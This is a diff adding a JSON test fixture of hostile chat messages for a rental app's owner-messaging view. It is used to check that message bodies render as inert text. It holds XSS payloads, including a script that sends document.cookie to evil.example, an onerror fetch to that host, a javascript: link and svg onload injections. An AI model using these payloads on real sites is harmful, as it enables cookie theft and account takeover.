@@ -1,0 +1,10 @@
+{
+  "_note": "Hostile owner-message thread (GET /rental/[id]/message). Message bodies are attacker-authored free text — the highest XSS surface in the app. The chat UI must render these as inert text only (never x-html/innerHTML). Drives the XSS-safe-rendering test for owner messaging.",
+  "rentalid": "9000001",
+  "messages": [
+    { "username": "renter", "is_admin": false, "is_support": false, "when": "2024-01-01 23:40:00 UTC", "message": "Hi, testing the connection." },
+    { "username": "<b>rig owner</b>", "is_admin": false, "is_support": false, "when": "2024-01-01 23:41:00 UTC", "message": "<script>document.location='https://evil.example/'+document.cookie</script>" },
+    { "username": "owner", "is_admin": false, "is_support": false, "when": "2024-01-01 23:42:00 UTC", "message": "<img src=x onerror=\"fetch('https://evil.example/x')\"> click <a href=\"javascript:alert(1)\">here</a>" },
+    { "username": "support", "is_admin": true, "is_support": true, "when": "2024-01-01 23:43:00 UTC", "message": "Normal support reply. </div><svg onload=alert(2)>" }
+  ]
+}
